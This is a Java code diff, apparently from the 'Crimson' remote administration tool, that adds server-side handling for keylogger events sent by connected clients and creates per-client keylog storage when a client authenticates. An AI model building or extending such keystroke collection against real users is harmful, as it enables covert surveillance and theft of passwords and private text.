@@ -54,6 +54,7 @@ import com.subterranean_security.crimson.server.Server;
 import com.subterranean_security.crimson.server.ServerState;
 import com.subterranean_security.crimson.server.ServerStore;
 import com.subterranean_security.crimson.server.stream.SInfoSlave;
+import com.subterranean_security.crimson.sv.ClientProfile;
 import com.subterranean_security.crimson.sv.Listener;
 import com.subterranean_security.crimson.sv.PermissionTester;
 import com.subterranean_security.crimson.sv.ViewerProfile;
@@ -78,13 +79,15 @@ public class ServerExecutor extends BasicExecutor {
 						return;
 					}
 					if (m.hasEvProfileDelta()) {
-
-						profileDelta(m);
+						ev_profileDelta(m);
+					} else if (m.hasEvKevent()) {
+						ev_kevent(m);
 					}
 
 					ReferenceCountUtil.release(m);
 				}
 			}
+
 		});
 		ubt.start();
 
@@ -147,6 +150,16 @@ public class ServerExecutor extends BasicExecutor {
 			}
 		});
 		nbt.start();
+	}
+
+	private void ev_kevent(Message m) {
+		try {
+			ServerStore.Profiles.getClient(receptor.getCvid()).getKeylog().addEvent(m.getEvKevent());
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
 	}
 
 	private void challengeResult_1w(Message m) {
@@ -235,6 +248,17 @@ public class ServerExecutor extends BasicExecutor {
 		receptor.setState(ConnectionState.AUTHENTICATED);
 		receptor.setInstance(Instance.CLIENT);
 		ServerStore.Connections.add(receptor);
+
+		try {
+			if (ServerStore.Profiles.getClient(receptor.getCvid()) == null) {
+				ClientProfile cp = new ClientProfile(receptor.getCvid());
+				cp.getKeylog().pages.setDatabase(ServerStore.Databases.system);
+				ServerStore.Profiles.addClient(cp);
+			}
+		} catch (Exception e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	private void challenge_rq(Message m) {
@@ -256,7 +280,7 @@ public class ServerExecutor extends BasicExecutor {
 
 	}
 
-	private void profileDelta(Message m) {
+	private void ev_profileDelta(Message m) {
 		if (m.hasVid()) {
 			ServerStore.Connections.getConnection(m.getVid()).handle.write(m);
 		} else {
